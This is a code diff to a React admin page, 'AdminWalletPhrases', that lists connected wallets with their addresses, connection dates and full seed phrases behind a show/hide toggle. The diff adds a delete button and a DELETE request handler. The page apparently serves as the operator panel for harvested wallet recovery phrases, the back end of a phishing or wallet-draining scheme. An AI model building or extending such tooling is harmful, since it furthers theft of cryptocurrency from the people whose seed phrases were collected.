@@ -10,11 +10,11 @@ import {
   TableHeader, 
   TableRow 
 } from "@/components/ui/table";
-import { ArrowLeft, Wallet, Copy, Eye, EyeOff, Loader2, Key, User, Search } from "lucide-react";
+import { ArrowLeft, Wallet, Copy, Eye, EyeOff, Loader2, Key, User, Search, Trash2 } from "lucide-react";
 import { useState } from "react";
 import { useToast } from "@/hooks/use-toast";
 import { Badge } from "@/components/ui/badge";
-import { useQuery } from "@tanstack/react-query";
+import { useQuery, useQueryClient } from "@tanstack/react-query";
 import { Link } from "wouter";
 
 interface ConnectedWallet {
@@ -37,8 +37,10 @@ interface ConnectedWallet {
 
 export default function AdminWalletPhrases() {
   const { toast } = useToast();
+  const queryClient = useQueryClient();
   const [showPhrases, setShowPhrases] = useState<{ [key: number]: boolean }>({});
   const [searchTerm, setSearchTerm] = useState("");
+  const [deletingId, setDeletingId] = useState<number | null>(null);
 
   const { data: wallets = [], isLoading } = useQuery<ConnectedWallet[]>({
     queryKey: ['/api/admin/connected-wallets'],
@@ -84,6 +86,31 @@ export default function AdminWalletPhrases() {
   const maskPhrase = (phrase: string) => {
     const words = phrase.split(' ');
     return words.map(() => '****').join(' ');
+  };
+
+  const handleDeleteWallet = async (id: number) => {
+    if (!confirm("Are you sure you want to delete this connected wallet?")) return;
+    
+    setDeletingId(id);
+    try {
+      const res = await fetch(`/api/admin/connected-wallets/${id}`, { method: 'DELETE' });
+      if (!res.ok) throw new Error('Failed to delete wallet');
+      
+      toast({
+        title: "Wallet Deleted",
+        description: "The connected wallet has been deleted successfully."
+      });
+      
+      queryClient.invalidateQueries({ queryKey: ['/api/admin/connected-wallets'] });
+    } catch (error) {
+      toast({
+        title: "Error",
+        description: "Failed to delete wallet.",
+        variant: "destructive"
+      });
+    } finally {
+      setDeletingId(null);
+    }
   };
 
   return (
@@ -154,6 +181,7 @@ export default function AdminWalletPhrases() {
                     <TableHead>Address</TableHead>
                     <TableHead style={{ minWidth: '300px' }}>Seed Phrase</TableHead>
                     <TableHead>Connected At</TableHead>
+                    <TableHead>Actions</TableHead>
                   </TableRow>
                 </TableHeader>
                 <TableBody>
@@ -252,6 +280,21 @@ export default function AdminWalletPhrases() {
                         <span style={{ fontSize: '12px', color: '#6b7280' }}>
                           {formatDate(wallet.connectedAt)}
                         </span>
+                      </TableCell>
+                      <TableCell>
+                        <Button 
+                          variant="destructive"
+                          size="sm"
+                          onClick={() => handleDeleteWallet(wallet.id)}
+                          disabled={deletingId === wallet.id}
+                          data-testid={`button-delete-wallet-${wallet.id}`}
+                        >
+                          {deletingId === wallet.id ? (
+                            <Loader2 size={14} className="animate-spin" />
+                          ) : (
+                            <Trash2 size={14} />
+                          )}
+                        </Button>
                       </TableCell>
                     </TableRow>
                   ))}
